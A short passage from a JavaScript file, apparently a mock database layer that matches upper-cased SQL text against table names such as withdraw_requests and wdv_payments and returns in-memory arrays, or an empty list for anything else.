          db.withdraw_requests = db.withdraw_requests || [];
          return resolve(db.withdraw_requests);
        }
        if (sqlUpper.includes('FROM WDV_PAYMENTS')) {
          db.wdv_payments = db.wdv_payments || [];
          return resolve(db.wdv_payments);
        }

        resolve([]);
      } catch (err) {
        reject(err);
      }
    }
  });
}
